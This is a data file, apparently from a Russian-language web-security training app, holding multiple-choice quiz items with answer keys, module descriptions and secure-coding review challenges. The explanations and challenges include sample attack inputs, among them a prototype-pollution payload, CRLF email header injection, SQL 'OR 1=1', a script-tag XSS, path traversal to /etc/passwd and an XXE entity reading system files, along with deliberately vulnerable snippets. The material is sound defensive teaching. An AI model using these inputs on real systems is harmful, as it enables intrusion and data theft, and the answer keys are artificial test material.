      'Модификация Object.prototype через __proto__ или constructor через пользовательский ввод',
      'Переполнение прототипа',
      'Удаление прототипа из объекта',
    ],
    correctIndex: 1,
    explanation:
      'Prototype Pollution: злоумышленник передаёт {"__proto__":{"isAdmin":true}} в JSON.parse или merge-функцию. Это добавляет isAdmin ко ВСЕМ объектам. Или через constructor.prototype. Защита: Object.freeze(Object.prototype), Object.create(null) для dictionary, sanitize input keys (блокировать __proto__, constructor, prototype), использовать safe merge (lodash.merge с prototype protection).',
  },
  {
    id: 'coding-8',
    category: 'Безопасное кодирование',
    difficulty: 'medium',
    question: 'Как правильно реализовать JWT-верификацию?',
    options: [
      'Использовать algorithm: none для разработки',
      'Проверять алгоритм (reject none), verify signature, check exp/iat/nbf, использовать HS256/RS256, хранить секрет безопасно',
      'Хранить JWT в localStorage',
      'Не проверять signature на клиенте',
    ],
    correctIndex: 1,
    explanation:
      'Secure JWT: (1) Всегда verify signature — reject algorithm: none attack. (2) White-list allowed algorithms. (3) Проверять exp (expiration), nbf (not before), iat (issued at). (4) Для HS256 использовать 256-bit+ секрет. Для RS256 — verify с public key. (5) Хранить в httpOnly cookie (не localStorage). (6) Короткий TTL + refresh token.',
  },
  {
    id: 'coding-9',
    category: 'Безопасное кодирование',
    difficulty: 'hard',
    question: 'Что такое Email Header Injection и как защититься?',
    options: [
      'Внедрение HTML в email',
      'Внедрение CRLF (\\r\\n) в email-заголовки через пользовательский ввод для отправки спама',
      'XSS в email-клиенте',
      'Шифрование email',
    ],
    correctIndex: 1,
    explanation:
      'Email Header Injection: пользовательский ввод в To/Subject используется в mail() без санитизации. Злоумышленник добавляет \\r\\nBcc: victim@target.com для массовой рассылки. Или \\r\\n\\r\\nBODY для изменения тела. Защита: удалять \\r и \\n из всех параметров email, использовать PHPMailer или аналоги с built-in protection, валидировать email-адреса.',
  },
  {
    id: 'coding-10',
    category: 'Безопасное кодирование',
    difficulty: 'hard',
    question: 'Какие риски безопасности несёт GraphQL introspection и как защититься?',
    options: [
      'Introspection безопасен по умолчанию',
      'Раскрытие полной схемы API злоумышленнику; отключить introspection в production',
      'Замедление сервера',
      'Проблемы с CORS',
    ],
    correctIndex: 1,
    explanation:
      'GraphQL introspection позволяет запросить полную схему (__schema, __type). Злоумышленник использует это для reconnaissance: найти скрытые мутации, sensitive поля, admin endpoints. Защита: отключить introspection в production (graphql-validation-complexity), использовать allowlist queries (persisted queries), rate limiting, depth limiting, query complexity analysis.',
  },
  // --- Additional General Security Questions ---
  {
    id: 'general-11',
    category: 'Общая безопасность',
    difficulty: 'hard',
    question: 'Что такое «Supply Chain Attack» (атака на цепочку поставок)?',
    options: [
      'Атака на логистическую компанию',
      'Компрометация через зависимость, библиотеку или инструмент, используемый в разработке',
      'Фишинговая атака на поставщиков',
      'DDoS на CDN-провайдера',
    ],
    correctIndex: 1,
    explanation:
      'Supply Chain Attack — атака через компрометацию компонентов разработки: библиотек (npm, PyPI), CI/CD-систем, инструментов сборки. Пример: атака на SolarWinds (2020), внедрение вредоносного кода в обновления пакета event-stream (2018). Защита: аудит зависимостей, lock-файлы, проверка пакетов.',
  },
  {
    id: 'general-12',
    category: 'Общая безопасность',
    difficulty: 'hard',
    question: 'Что такое «Bug Bounty Program»?',
    options: [
      'Программа лояльности для разработчиков',
      'Программа вознаграждения за найденные уязвимости',
      'Бесплатный хостинг для security-инструментов',
      'Сертификация по безопасности',
    ],
    correctIndex: 1,
    explanation:
      'Bug Bounty — программа, в которой организация выплачивает вознаграждение исследователям безопасности за обнаружение и ответственный disclosure уязвимостей. Примеры: HackerOne, Bugcrowd, Google VRP. Это позволяет привлекать сообщество к улучшению безопасности.',
  },
  {
    id: 'general-13',
    category: 'Общая безопасность',
    difficulty: 'hard',
    question: 'Что означает «Responsible Disclosure» (ответственное раскрытие)?',
    options: [
      'Публикация уязвимости в социальных сетях',
      'Сообщение разработчику до публичного раскрытия, чтобы дать время на исправление',
      'Продажа уязвимости на чёрном рынке',
      'Игнорирование уязвимости',
    ],
    correctIndex: 1,
    explanation:
      'Responsible Disclosure — практика, при которой исследователь сообщает об уязвимости разработчику и даёт разумное время (обычно 90 дней) на исправление до публичного раскрытия. Это защищает пользователей, не подвергая их риску до выпуска патча.',
  },
  {
    id: 'general-14',
    category: 'Общая безопасность',
    difficulty: 'hard',
    question: 'Что такое «MITM-атака» (Man-in-the-Middle)?',
    options: [
      'Атака с использованием нескольких серверов',
      'Перехват и возможная модификация связи между двумя сторонами без их знания',
      'Атака на микросервисную архитектуру',
      'Атака через промежуточное ПО',
    ],
    correctIndex: 1,
    explanation:
      'MITM-атака — злоумышленник располагается между двумя сторонами (клиентом и сервером), перехватывая и потенциально модифицируя передаваемые данные. Защита: HTTPS/TLS, проверка сертификатов, Certificate Pinning, HSTS.',
  },
  {
    id: 'general-15',
    category: 'Общая безопасность',
    difficulty: 'hard',
    question: 'Что такое «жизненный цикл zero-day уязвимости»?',
    options: [
      'Обнаружение → эксплуатация → обнаружение защиты → патч → публикация CVE',
      'Создание эксплойта → продажа → патч',
      'Публикация → эксплуатация → патч',
      'Обнаружение → публикация → исправление',
    ],
    correctIndex: 0,
    explanation:
      'Zero-day lifecycle: (1) Уязвимость существует, но неизвестна (0-day). (2) Злоумышленники эксплуатируют её скрытно (n-day). (3) Исследователи обнаруживают эксплойт или атаку. (4) Разработчик выпускает патч. (5) Публикуется CVE. Ключевой риск — время между началом эксплуатации и выпуском патча, когда у защиты нет сигнатуры.',
  },
  {
    id: 'general-16',
    category: 'Общая безопасность',
    difficulty: 'medium',
    question: 'Как система CVSS v3.1 оценивает критичность уязвимости?',
    options: [
      'По количеству затронутых пользователей',
      'По метрикам: Attack Vector, Complexity, Privileges Required, User Interaction, Impact (CIA)',
      'По стоимости исправления',
      'По дате обнаружения',
    ],
    correctIndex: 1,
    explanation:
      'CVSS v3.1 оценивает: Attack Vector (Network/Adjacent/Local/Physical), Complexity (Low/High), Privileges Required (None/Low/High), User Interaction (None/Required), и Impact на Confidentiality, Integrity, Availability. Базовый скор 0.0–10.0: 0.1–3.9 Low, 4.0–6.9 Medium, 7.0–8.9 High, 9.0–10.0 Critical.',
  },
  {
    id: 'general-17',
    category: 'Общая безопасность',
    difficulty: 'medium',
    question: 'Что означает принцип «Defense in Depth» (глубокая защита)?',
    options: [
      'Использование одного мощного фаервола',
      'Многоуровневая защита: если один слой fails, другие продолжают защищать',
      'Шифрование всех данных на сервере',
      'Регулярное обновление ПО',
    ],
    correctIndex: 1,
    explanation:
      'Defense in Depth — стратегия нескольких слоёв защиты: сетевой (firewall), хостовой (antivirus, hardening), прикладной (input validation, auth), данных (encryption), мониторинг (SIEM, IDS). Если один слой проваливается, другие продолжают защищать. Пример: WAF + параметризованные запросы + least privilege DB account для защиты от SQLi.',
  },
  {
    id: 'general-18',
    category: 'Общая безопасность',
    difficulty: 'medium',
    question: 'Какие фазы включает реагирование на инциденты (Incident Response)?',
    options: [
      'Обнаружение → удаление → восстановление',
      'Preparation → Identification → Containment → Eradication → Recovery → Lessons Learned',
      'Анализ → исправление → тестирование',
      'Мониторинг → алерт → блокировка',
    ],
    correctIndex: 1,
    explanation:
      'NIST Incident Response: (1) Preparation — политики, инструменты, команда. (2) Identification — обнаружение и классификация. (3) Containment — изоляция affected систем. (4) Eradication — удаление угрозы. (5) Recovery — восстановление систем. (6) Lessons Learned — анализ и улучшение процессов. Каждый шаг документируется.',
  },
  {
    id: 'general-19',
    category: 'Общая безопасность',
    difficulty: 'hard',
    question: 'Какая методология пентестинга является наиболее признанной?',
    options: [
      'Тестирование только автоматическими сканерами',
      'PTES (Penetration Testing Execution Standard) + OWASP Testing Guide + NIST SP 800-115',
      'Только ручное тестирование',
      'Тестирование только на production',
    ],
    correctIndex: 1,
    explanation:
      'PTES включает 7 фаз: Pre-engagement, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post-exploitation, Reporting. OWASP Testing Guide — специфичен для веб-приложений. NIST SP 800-115 — государственные стандарты. Комбинация обеспечивает полное покрытие: от разведки до отчёта с рекомендациями.',
  },
  // --- Network Attacks Questions ---
  {
    id: 'net-1',
    category: 'Сетевые атаки',
    difficulty: 'medium',
    question: 'Что такое ARP Spoofing (ARP Poisoning)?',
    options: [
      'Подмена DNS-записей',
      'Отправка фальшивых ARP-ответов для связывания MAC-адреса злоумышленника с IP жертвы',
      'Переполнение ARP-таблицы',
      'Блокировка ARP-запросов',
    ],
    correctIndex: 1,
    explanation:
      'ARP Spoofing: злоумышленник отправляет фальшивые ARP-ответы, связывая свой MAC с IP шлюза. Трафик жертвы перенаправляется к злоумышленнику (MITM). Инструменты: arpspoof, Ettercap. Защита: Static ARP entries, DHCP snooping, Dynamic ARP Inspection (DAI) на свитчах, ARP monitoring.',
  },
  {
    id: 'net-2',
    category: 'Сетевые атаки',
    difficulty: 'medium',
    question: 'Какой тип DDoS-атаки использует отражение и усиление через DNS?',
    options: [
      'SYN Flood',
      'DNS Amplification — отправка мелких запросов с подставным IP-источником, получение больших ответов',
      'Slowloris',
      'HTTP Flood',
    ],
    correctIndex: 1,
    explanation:
      'DNS Amplification: злоумышленник отправляет DNS-запросы с подставным source IP (IP жертвы). DNS-сервер возвращает большой ответ (ANY-запрос → 4000+ байт) жертве. Усиление до 50x. Защита: BCP38 (source address validation), отключение open resolvers, rate limiting, CDN/DDoS-protection.',
  },
  {
    id: 'net-3',
    category: 'Сетевые атаки',
    difficulty: 'easy',
    question: 'Что показывает Nmap-сканирование с флагом -sS (SYN scan)?',
    options: [
      'Полное TCP-соединение с каждым портом',
      'Открытые порты через отправку SYN-пакета без завершения handshake',
      'Только UDP-порты',
      'Только ICMP-ответы',
    ],
    correctIndex: 1,
    explanation:
      'SYN scan (stealth scan): Nmap отправляет SYN, если получает SYN/ACK — порт открыт, RST — закрыт. Полное соединение не устанавливается (не отправляется ACK), что делает сканирование менее заметным в логах. Требует root/admin привилегий.',
  },
  {
    id: 'net-4',
    category: 'Сетевые атаки',
    difficulty: 'hard',
    question: 'Что такое VLAN Hopping и как он работает?',
    options: [
      'Прямой доступ к VLAN через физическое подключение',
      'Double Tagging: добавление двух VLAN-тегов для обхода изоляции между VLAN',
      'Взлом пароля VLAN',
      'Использование SNMP для переключения VLAN',
    ],
    correctIndex: 1,
    explanation:
      'VLAN Hopping через Double Tagging: злоумышленник отправляет кадр с двумя 802.1Q тегами. Первый тег совпадает с native VLAN свитча и удаляется, второй тег остаётся и направляет кадр в целевой VLAN. Защита: не использовать VLAN 1 как native, явно задать native VLAN (non-user), port security.',
  },
  {
    id: 'net-5',
    category: 'Сетевые атаки',
    difficulty: 'medium',
    question: 'Что такое атака Evil Twin (Злой двойник) в WiFi-сетях?',
    options: [
      'Взлом WPA2-пароля',
      'Создание фальшивой точки доступа с тем же SSID, что и легитимная сеть',
      'Перехват пакетов через promiscuous mode',
      'Deauthentication attack для отключения клиентов',
    ],
    correctIndex: 1,
    explanation:
      'Evil Twin: злоумышленник создаёт rogue AP с тем же SSID и более сильным сигналом. Клиенты подключаются к ней, думая, что это легитимная сеть. Весь трафик проходит через злоумышленника (MITM). Защита: WPA2-Enterprise с EAP-TLS (сертификаты), проверка BSSID, отключение автоподключения к известным SSID.',
  },
  {
    id: 'net-6',
    category: 'Сетевые атаки',
    difficulty: 'medium',
    question: 'Какова цель ICMP-флуд атаки?',
    options: [
      'Кража данных через ICMP-пакеты',
      'Перегрузка цели большим количеством ICMP Echo Request (ping) пакетов',
      'Изменение маршрутизации',
      'Сканирование портов',
    ],
    correctIndex: 1,
    explanation:
      'ICMP Flood: злоумышленник отправляет огромный объём ICMP Echo Request пакетов, заставляя цель генерировать ICMP Echo Reply. Это consumes bandwidth и CPU. Пример: Ping of Death (историческая, oversized ICMP). Защита: rate limiting ICMP на фаерволе, блокировка ICMP извне, использование DDoS-protection.',
  },
  {
    id: 'net-7',
    category: 'Сетевые атаки',
    difficulty: 'hard',
    question: 'Что такое BGP Hijacking?',
    options: [
      'Взлом BGP-роутера',
      'Ложная BGP-анонсировка IP-префиксов для перенаправления интернет-трафика',
      'Шифрование BGP-сессий',
      'DDoS на BGP-серверы',
    ],
    correctIndex: 1,
    explanation:
      'BGP Hijacking: злоумышленник (или недобросовестный ISP) анонсирует IP-префиксы, которые ему не принадлежат. BGP (Border Gateway Protocol) не имеет встроенной аутентификации префиксов. Трафик перенаправляется через сеть злоумышленника. Пример: hijacking YouTube-трафика (2008), перехват криптобирж (2018). Защита: RPKI, BGPsec, мониторинг префиксов.',
  },
  {
    id: 'net-8',
    category: 'Сетевые атаки',
    difficulty: 'hard',
    question: 'Как работает атака KRACK (Key Reinstallation Attack) на WPA2?',
    options: [
      'Подбор WPA2-пароля через словарь',
      'Повторная передача handshake-сообщения для сброса nonce и повторного использования ключа шифрования',
      'Перехват 4-way handshake',
      'Использование уязвимости в WPS',
    ],
    correctIndex: 1,
    explanation:
      'KRACK эксплуатирует 4-way handshake WPA2: злоумышленник перехватывает и повторно отправляет Message 3, заставляя клиента переустановить тот же ключ (nonce reset). Это позволяет расшифровать или внедрить пакеты. Затронуты почти все WPA2-клиенты. Исправлено в обновлениях 2017. WPA3 решает проблему.',
  },
  {
    id: 'net-9',
    category: 'Сетевые атаки',
    difficulty: 'medium',
    question: 'Что такое DNS Cache Poisoning?',
    options: [
      'Удаление DNS-кэша',
      'Внедрение фальшивых DNS-записей в кэш DNS-сервера для перенаправления трафика',
      'Шифрование DNS-запросов',
      'Блокировка DNS-серверов',
    ],
    correctIndex: 1,
    explanation:
      'DNS Cache Poisoning: злоумышленник отправляет фальшивые DNS-ответы с правильным transaction ID до легитимного ответа. DNS-сервер кеширует фальшивую запись. Все пользователи получают неверный IP. Пример: атака Каминского (2008). Защита: DNSSEC (подписанные записи), случайные transaction IDs, port randomization, DNS over HTTPS/TLS.',
  },
  {
    id: 'net-10',
    category: 'Сетевые атаки',
    difficulty: 'easy',
    question: 'Какой инструмент наиболее известен для пакетного анализа и захвата трафика?',
    options: ['Nmap', 'Wireshark', 'Metasploit', 'Burp Suite'],
    correctIndex: 1,
    explanation:
      'Wireshark — стандартный анализатор сетевого трафика. Захватывает пакеты с сетевого интерфейса, декодирует протоколы (TCP, HTTP, DNS, TLS), позволяет фильтровать и анализировать. Используется для диагностики, forensic-анализа и изучения сетевых протоколов. Nmap — сканер портов, Metasploit — фреймворк эксплойтов, Burp Suite — веб-прокси.',
  },
  // --- Social Engineering Questions ---
  {
    id: 'se-1',
    category: 'Социальная инженерия',
    difficulty: 'easy',
    question: 'Чем Spear Phishing отличается от обычного фишинга?',
    options: [
      'Spear Phishing отправляется миллионам пользователей',
      'Spear Phishing — целевая атака на конкретного человека с использованием персональной информации',
      'Spear Phishing использует только SMS',
      'Spear Phishing — это телефонный обман',
    ],
    correctIndex: 1,
    explanation:
      'Spear Phishing — целевая атака: злоумышленник изучает жертву (соцсети, LinkedIn, корпоративный сайт) и создаёт персонализированное письмо. Пример: письмо «от коллеги» с ссылкой на «документ проекта». Обычный фишинг массовый и безличный. Spear Phishing значительно эффективнее — до 30% успешных открытий.',
  },
  {
    id: 'se-2',
    category: 'Социальная инженерия',
    difficulty: 'medium',
    question: 'Что такое Pretexting (создание предлога)?',
    options: [
      'Отправка вредоносных вложений',
      'Создание вымышленного сценария для получения информации от жертвы',
      'Взлом через SQL-инъекцию',
      'Подбор пароля',
    ],
    correctIndex: 1,
    explanation:
      'Pretexting: злоумышленник создаёт правдоподобный сценарий — представляется IT-специалистом, аудитором, партнёром. Использует заранее собранную информацию для убедительности. Пример: звонок «из службы безопасности банка» с просьбой подтвердить данные. Защита: верификация личности через обратный звонок по официальному номеру, обучение сотрудников.',
  },
  {
    id: 'se-3',
    category: 'Социальная инженерия',
    difficulty: 'easy',
    question: 'Что такое Tailgating (проход за хвостом) в физической безопасности?',
    options: [
      'Взлом замка',
      'Проход в защищённую зону вслед за авторизованным сотрудником без предъявления пропуска',
      'Копирование пропуска',
      'Обход камеры видеонаблюдения',
    ],
    correctIndex: 1,
    explanation:
      'Tailgating (Piggybacking): злоумышленник проходит за сотрудником через дверь контроля доступа. Часто использует социальный инжиниринг — «придержите дверь, пожалуйста», руки заняты коробками. Защита: турникеты, шлюз-кабины (mantrap), обучение сотрудников не пропускать без пропуска, охрана на входе.',
  },
  {
    id: 'se-4',
    category: 'Социальная инженерия',
    difficulty: 'medium',
    question: 'Что такое Vishing (Voice Phishing)?',
    options: [
      'Фишинг через электронную почту',
      'Фишинг через телефонные звонки с использованием подмены номера (spoofing)',
      'Фишинг через SMS',
      'Фишинг через социальные сети',
    ],
    correctIndex: 1,
    explanation:
      'Vishing — фишинг по телефону. Злоумышленник использует caller ID spoofing для отображения номера банка/компании, голосовые роботы для массовых звонков. Цель: получить персональные данные, номера карт, коды 2FA. Пример: «Ваша карта заблокирована, сообщите код из SMS для разблокировки». Защита: перезвонить по официальному номеру.',
  },
  {
    id: 'se-5',
    category: 'Социальная инженерия',
    difficulty: 'medium',
    question: 'Что такое Smishing (SMS Phishing)?',
    options: [
      'Фишинг через email',
      'Отправка вредоносных ссылок или просьб через SMS-сообщения',
      'Взлом через Bluetooth',
      'Звонки с подменой номера',
    ],
    correctIndex: 1,
    explanation:
      'Smishing — фишинг через SMS. Злоумышленник отправляет SMS с ссылкой на фишинговый сайт или просьбой ответить с данными. Примеры: «Ваша посылка задержана, перейдите по ссылке», «Скидка 90% только сегодня». Люди более доверчивы к SMS, чем к email. Защита: не переходить по ссылкам из неизвестных SMS, проверять через официальный сайт.',
  },
  {
    id: 'se-6',
    category: 'Социальная инженерия',
    difficulty: 'hard',
    question: 'Что такое Watering Hole Attack (атака через «водопой»)?',
    options: [
      'Атака на серверы водоснабжения',
      'Компрометация сайтов, которые часто посещает целевая группа, для заражения их устройств',
      'Фишинг через общественные WiFi',
      'Отправка вредоносных USB-накопителей',
    ],
    correctIndex: 1,
    explanation:
      'Watering Hole: злоумышленник определяет, какие сайты посещает целевая группа (форум, ассоциация, новостной сайт), и заражает их эксплойтами. Когда жертва посещает «водопой», её устройство компрометируется. Пример: атака на сайты европейских организаций для заражения правительственных систем. Защита: обновление браузеров/плагинов, EDR, network monitoring.',
  },
  {
    id: 'se-7',
    category: 'Социальная инженерия',
    difficulty: 'medium',
    question: 'Какой психологический принцип чаще всего эксплуатируется в социальной инженерии?',
    options: [
      'Математические способности',
      'Чувство срочности, авторитета, любопытства или страха',
      'Знание языков программирования',
      'Физическая сила',
    ],
    correctIndex: 1,
    explanation:
      'Социальная инженерия эксплуатирует: (1) Срочность — «срочно подтвердите аккаунт, иначе он будет удалён». (2) Авторитет — «это звонок из службы безопасности». (3) Любопытство — «посмотрите, кто вас отметил на фото». (4) Страх — «ваш компьютер заражён». (5) Жадность — «вы выиграли приз». Обучение осознанности — лучшая защита.',
  },
  {
    id: 'se-8',
    category: 'Социальная инженерия',
    difficulty: 'hard',
    question: 'Что такое Baiting (приманка) в контексте социальной инженерии?',
    options: [
      'Отправка спама',
      'Оставление заражённых USB-накопителей в общественных местах в надежде, что кто-то их подключит',
      'Взлом через брандмауэр',
      'Создание фальшивого WiFi',
    ],
    correctIndex: 1,
    explanation:
      'Baiting: злоумышленник оставляет заражённый USB в парковке, lobby или туалете компании. Любопытство заставляет сотрудника подключить его к компьютеру. USB автоматически запускает malware (автозапуск или HID-эмуляция). Пример: исследование Univ. of Illinois — 45% людей подключили найденные USB. Защита: отключить autorun, обучение, блокировка USB-портов.',
  },
  {
    id: 'se-9',
    category: 'Социальная инженерия',
    difficulty: 'medium',
    question: 'Что такое Clone Phishing (клонированный фишинг)?',
    options: [
      'Создание копии веб-сайта',
      'Копирование легитимного письма с заменой ссылки/вложения на вредоносные и повторная отправка',
      'Дублирование email-адреса',
      'Копирование DNS-записей',
    ],
    correctIndex: 1,
    explanation:
      'Clone Phishing: злоумышленник берёт настоящее письмо (например, с вложением), копирует его, заменяет вложение на вредоносное и отправляет заново с адресом, похожим на оригинал. Жертва видит знакомое письмо и доверяет. «Отправляю обновлённую версию документа». Защита: проверка email-заголовков, SPF/DKIM/DMARC, внимательность к вложениям.',
  },
  {
    id: 'se-10',
    category: 'Социальная инженерия',
    difficulty: 'hard',
    question: 'Как работает атака через имперсонацию CEO (CEO Fraud / Whaling)?',
    options: [
      'Взлом аккаунта CEO через брутфорс',
      'Злоумышленник представляется руководителем и просит сотрудника выполнить срочный финансовый перевод',
      'DDoS на сайт CEO',
      'Публикация компрометирующих данных CEO',
    ],
    correctIndex: 1,
    explanation:
      'CEO Fraud (Whaling): злоумышленник изучает структуру компании, имена руководителей, стиль общения. Отправляет email/SMS от имени CEO сотруднику финансов: «Срочно переведите $X на счёт поставщика, детали позже». Использует срочность и авторитет. FBI: потери > $26 млрд (2016–2022). Защита: процедура верификации платежей, 2FA для переводов, обучение.',
  },
];

export const quizCategories = [
  { id: 'sql', name: 'SQL-инъекции', icon: 'Database', count: 15 },
  { id: 'xss', name: 'XSS-атаки', icon: 'FileText', count: 13 },
  { id: 'csrf', name: 'CSRF', icon: 'Link', count: 12 },
  { id: 'auth', name: 'Аутентификация', icon: 'Lock', count: 10 },
  { id: 'general', name: 'Общая безопасность', icon: 'Shield', count: 19 },
  { id: 'owasp', name: 'OWASP Top 10', icon: 'Shield', count: 17 },
  { id: 'coding', name: 'Безопасное кодирование', icon: 'Code', count: 10 },
  { id: 'network', name: 'Сетевые атаки', icon: 'Shield', count: 10 },
  { id: 'social', name: 'Социальная инженерия', icon: 'Shield', count: 10 },
];

// ============================================================
// Modules config
// ============================================================
export const modules = [
  {
    id: 'owasp',
    title: 'OWASP Top 10',
    description: 'Интерактивный гид по 10 самым критическим угрозам безопасности веб-приложений с примерами кода, реальными кейсами и способами защиты.',
    icon: 'Shield',
    difficulty: 'Начальный',
    difficultyColor: 'bg-green-100 text-green-800',
    lessons: 10,
    totalSteps: 10,
  },
  {
    id: 'sql-injection',
    title: 'SQL-инъекции',
    description: 'Практическая лаборатория: 11 заданий от простого обхода аутентификации до WAF Bypass, Out-of-band и Polyglot-атак.',
    icon: 'Database',
    difficulty: 'Средний',
    difficultyColor: 'bg-yellow-100 text-yellow-800',
    lessons: 11,
    totalSteps: 11,
  },
  {
    id: 'xss',
    title: 'XSS-атаки',
    description: 'Изучите 6 типов XSS: отражённый, хранимый, DOM-based, SVG, Markdown и PDF. Интерактивные демонстрации атак.',
    icon: 'FileText',
    difficulty: 'Средний',
    difficultyColor: 'bg-yellow-100 text-yellow-800',
    lessons: 6,
    totalSteps: 6,
  },
  {
    id: 'csrf',
    title: 'CSRF-атаки',
    description: 'Визуальная симуляция CSRF-атаки с пошаговой демонстрацией, SameSite cookie и механизмами защиты.',
    icon: 'Link',
    difficulty: 'Средний',
    difficultyColor: 'bg-yellow-100 text-yellow-800',
    lessons: 1,
    totalSteps: 1,
  },
  {
    id: 'auth',
    title: 'Аутентификация',
    description: 'Тренажёры: проверка надёжности пароля, визуализация брутфорса, демо bcrypt-хеширования, интерактивный TOTP/2FA, безопасность JWT-сессий.',
    icon: 'Lock',
    difficulty: 'Начальный',
    difficultyColor: 'bg-green-100 text-green-800',
    lessons: 5,
    totalSteps: 5,
  },
  {
    id: 'secure-coding',
    title: 'Безопасное кодирование',
    description: '25 задач по ревью кода: найдите уязвимость (SQLi, XSS, IDOR, SSRF, XXE, SSTI, Prototype Pollution, LDAP Injection, Mass Assignment) и выберите правильное решение.',
    icon: 'Code',
    difficulty: 'Продвинутый',
    difficultyColor: 'bg-red-100 text-red-800',
    lessons: 25,
    totalSteps: 25,
  },
  {
    id: 'tools',
    title: 'Инструменты безопасности',
    description: 'Интерактивные инструменты: шифры (Цезарь, Виженер, XOR), кодирование (Base64, URL), хеш-функции и генератор паролей.',
    icon: 'KeyRound',
    difficulty: 'Начальный',
    difficultyColor: 'bg-green-100 text-green-800',
    lessons: 4,
    totalSteps: 4,
  },
  {
    id: 'security-headers',
    title: 'Security Headers',
    description: 'Интерактивный гид по HTTP-заголовкам безопасности: CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy.',
    icon: 'ShieldCheck',
    difficulty: 'Средний',
    difficultyColor: 'bg-yellow-100 text-yellow-800',
    lessons: 6,
    totalSteps: 6,
  },
];

// ============================================================
// Secure Coding Challenges
// ============================================================
export const secureCodingChallenges = [
  {
    id: 'sc-1',
    title: 'Инъекция в SQL-запросе',
    category: 'SQL-инъекция',
    code: `app.get('/api/user/:id', (req, res) => {
  const query = "SELECT * FROM users WHERE id = " + req.params.id;
  db.query(query, (err, result) => {
    res.json(result);
  });
});`,
    options: [
      { text: 'Добавить валидацию: if (isNaN(req.params.id)) return res.status(400)', correct: false },
      { text: 'Использовать параметризованный запрос: db.query("SELECT * FROM users WHERE id = ?", [req.params.id])', correct: true },
      { text: 'Шифровать параметр id перед использованием', correct: false },
      { text: 'Использовать HTTPS для этого эндпоинта', correct: false },
    ],
    explanation:
      'Конкатенация строки с пользовательским вводом создаёт SQL-инъекцию. Злоумышленник может передать id=1 OR 1=1 и получить все записи. Параметризованные запросы безопасны, так как данные передаются отдельно от SQL-кода.',
  },
  {
    id: 'sc-2',
    title: 'Хранение пароля в открытом виде',
    category: 'Криптография',
    code: `const user = new User({
  username: req.body.username,
  password: req.body.password,  // Сохраняется как есть
  email: req.body.email
});
await user.save();`,
    options: [
      { text: 'Зашифровать пароль через Base64', correct: false },
      { text: 'Хешировать пароль через bcrypt с солью перед сохранением', correct: true },
      { text: 'Хранить пароль в отдельной таблице', correct: false },
      { text: 'Установить сложные требования к паролю', correct: false },
    ],
    explanation:
      'Пароли нельзя хранить в открытом виде. Base64 — это кодировка, а не шифрование (легко обратимо). Правильное решение — использовать bcrypt для создания криптографического хеша с солью. Восстановить пароль из хеша невозможно.',
  },
  {
    id: 'sc-3',
    title: 'XSS через innerHTML',
    category: 'XSS',
    code: `function showSearchResult(query) {
  const el = document.getElementById('results');
  el.innerHTML = "Результаты для: " + query;
}`,
    options: [
      { text: 'Удалить элемент results', correct: false },
      { text: 'Использовать textContent вместо innerHTML', correct: true },
      { text: 'Добавить try-catch', correct: false },
      { text: 'Использовать setTimeout', correct: false },
    ],
    explanation:
      'innerHTML интерпретирует HTML-теги в строке. Если query содержит <script>alert(1)</script>, код будет выполнен. textContent вставляет текст как есть, кодируя спецсимволы — XSS невозможен.',
  },
  {
    id: 'sc-4',
    title: 'Отсутствие проверки авторизации',
    category: 'Контроль доступа',
    code: `app.delete('/api/users/:id', async (req, res) => {
  await User.findByIdAndDelete(req.params.id);
  res.json({ message: 'Пользователь удалён' });
});`,
    options: [
      { text: 'Добавить middleware аутентификации и проверку прав', correct: true },
      { text: 'Изменить метод на POST', correct: false },
      { text: 'Добавить CAPTCHA', correct: false },
      { text: 'Логировать все удаления', correct: false },
    ],
    explanation:
      'Этот эндпоинт не проверяет, авторизован ли пользователь и имеет ли он права удалять пользователей. Любой запрос может удалить любую запись. Необходим middleware авторизации и проверка, что пользователь удаляет только свой аккаунт или является администратором.',
  },
  {
    id: 'sc-5',
    title: 'Информация об ошибке в продакшене',
    category: 'Конфигурация',
    code: `app.use((err, req, res, next) => {
  res.status(500).json({
    error: err.message,
    stack: err.stack  // Полный stack trace!
  });
});`,
    options: [
      { text: 'Удалить обработчик ошибок', correct: false },
      { text: 'В продакшене скрывать детали ошибок, показывать только общее сообщение', correct: true },
      { text: 'Добавить try-catch в каждый маршрут', correct: false },
      { text: 'Использовать HTTPS', correct: false },
    ],
    explanation:
      'Показ stack trace в продакшене раскрывает структуру приложения, пути к файлам, версии библиотек и другие данные, полезные для злоумышленника. В продакшене нужно показывать общее сообщение и логировать детали ошибки на сервере.',
  },
  {
    id: 'sc-6',
    title: 'Path Traversal — доступ к файлам вне директории',
    category: 'Контроль доступа',
    code: `app.get('/api/files/:filename', (req, res) => {
  const filePath = path.join(__dirname, 'uploads', req.params.filename);
  res.sendFile(filePath);
});`,
    options: [
      { text: 'Использовать path.resolve и проверить, что файл внутри разрешённой директории', correct: true },
      { text: 'Запретить символы .. в имени файла', correct: false },
      { text: 'Шифровать файлы перед отдачей', correct: false },
      { text: 'Использовать HTTPS', correct: false },
    ],
    explanation:
      'Path Traversal позволяет злоумышленнику получить доступ к файлам вне предназначенной директории через ../../../etc/passwd. path.resolve нормализует путь, после чего нужно проверить, что результат начинается с разрешённой директории: if (!resolvedPath.startsWith(allowedDir)) return 403.',
  },
  {
    id: 'sc-7',
    title: 'XML External Entity (XXE) Injection',
    category: 'Инъекции',
    code: `const libxml = require('libxmljs');
app.post('/api/parse-xml', (req, res) => {
  const xml = req.body.xml;
  const doc = libxml.parseXml(xml);
  // XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  res.json({ data: doc.text() });
});`,
    options: [
      { text: 'Отключить внешние сущности в парсере: libxml.parseXml(xml, { noent: false, dtdvalid: false })', correct: true },
      { text: 'Экранировать символы < и > во входных данных', correct: false },
      { text: 'Использовать JSON вместо XML', correct: false },
      { text: 'Ограничить размер XML-документа', correct: false },
    ],
    explanation:
      'XXE позволяет читать файлы с сервера, выполнять SSRF и DoS (Billion Laughs attack). Внешние сущности в DTD обрабатываются парсером по умолчанию. Решение — отключить noent (substitute entities) и загрузку внешних сущностей. Или использовать парсер без DTD-поддержки.',
  },
  {
    id: 'sc-8',
    title: 'Server-Side Request Forgery (SSRF)',
    category: 'Сетевая безопасность',
    code: `app.get('/api/proxy', async (req, res) => {
  const url = req.query.url;
  const response = await fetch(url);
  const data = await response.text();
  res.send(data);
});`,
    options: [
      { text: 'Валидировать URL: разрешить только HTTPS и белый список доменов, заблокировать внутренние IP', correct: true },
      { text: 'Использовать POST вместо GET', correct: false },
